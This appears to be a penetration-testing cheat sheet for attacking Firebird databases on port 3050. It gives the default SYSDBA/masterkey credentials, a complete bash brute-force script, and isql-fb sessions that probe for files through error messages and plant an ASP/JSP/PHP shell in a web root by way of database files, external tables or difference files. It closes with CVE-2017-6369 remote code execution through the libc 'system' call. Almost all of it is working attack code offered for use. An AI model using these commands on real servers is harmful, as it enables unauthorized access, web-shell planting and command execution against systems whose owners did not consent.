## TCP 3050 firebird

### Firebird CLI tools

```
sudo apt install firebird3.0-utils
```
### Firebird GUI Database Browser
```
sudo apt install firerobin
```

### Default Credentials
```
SYSDBA/masterkey
```

### Firebird Bruteforce

*Script Source:* https://github.com/InfosecMatter/Scripts/blob/master/firebird-bruteforce.sh
```
#!/bin/bash
# contact@infosecmatter.com

host="$1"
user="$2"
wordlist="$3"

if [ ! -f "${wordlist}" ] || [ -z "${user}" ]; then
  echo "usage: `basename $0` <IP> <username> <wordlist.txt>"
  exit 1
fi

echo "`date`: FireBird login attack on ${host} against ${user} user using ${wordlist} wordlist"

tr -d '\r' <"${wordlist}" | while read pwd; do
  echo "`date`: Trying ${pwd}"

  echo "CONNECT '${host}/3050:a' user '${user}' password '${pwd}';" | isql-fb -q 2>&1 | \
  grep -q "The system cannot find the file specified." && {
    echo "Password for user ${user} is: ${pwd}"
    exit 0
  }
done
```
**Command**
```
firebird_bruteforce.sh <IP> SYSDBA <path/to/wordlist>
```

### File Enumeration
```
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\psplog.txt' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\PSPLOG.TXT"
-Error while trying to create file
-The file exists.
```
### Directory Enumeration
```
root@kali:~# isql-fb
SQL> create database '10.1.10.101/3050:C:\inetpub' user 'SYSDBA' password 'masterkey';

Statement failed, SQLSTATE = 08001
I/O error during "CreateFile (create)" operation for file "C:\INETPUB"
-Error while trying to create file
-Access is denied. 
```

### Creating a file
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\inetpub\wwwroot\mytest.asp' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a ( x BLOB);
SQL> INSERT INTO a VALUES ('<ASP/JSP/PHP shell>');
SQL> COMMIT;
SQL> EXIT;
```

### Deleteing a file
``` 
SQL> drop database;
```
### Data Types
Tables can be created in external files without garbage characters. Try the blob and char types to see if they are allowed.

#### Blob Data type
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x blob);

Statement failed, SQLSTATE = HY004
unsuccessful metadata update
-CREATE TABLE A failed
-SQL error code = -607
-Invalid command
-Data type BLOB is not supported for EXTERNAL TABLES. Relation 'A', field 'X'
```
#### Char Data type
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a EXTERNAL 'C:\inetpub\wwwroot\mytest.asp' ( x char(2000));
SQL> 
SQL> INSERT INTO a values ('<%= date() %>');

Statement failed, SQLSTATE = 28000
Use of external file at location C:\inetpub\wwwroot\mytest.asp is not allowed by server configuration
```

### Difference Files
```
root@kali:~# isql-fb
SQL> CREATE DATABASE '10.1.10.101/3050:C:\non-existent-file' user 'SYSDBA' password 'masterkey';
SQL> CREATE TABLE a( x blob);
SQL> ALTER DATABASE ADD DIFFERENCE FILE 'C:\inetpub\wwwroot\mytest.asp';
SQL> ALTER DATABASE BEGIN BACKUP;
SQL> INSERT INTO a VALUES ('<ASP/JSP/PHP shell>');
SQL> COMMIT;
SQL> EXIT;
```

### CVE-2017-6369

#### RCE
```
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS cstring(4096) ENTRY_POINT 'system' MODULE_NAME '/lib/libc.so';

SQL> SELECT FIRST 1 exec('<COMMAND>') FROM any_table LIMIT 1;

```
#### RCE #2
```
SQL> DECLARE EXTERNAL FUNCTION exec cstring(4096) RETURNS integer BY VALUE ENTRY_POINT 'system' MODULE_NAME 'fbudf';

SQL> SELECT FIRST 1 exec('<COMMAND>') FROM any_table LIMIT 1;
```
  
## Additional References
 https://www.infosecmatter.com/firebird-database-exploitation/
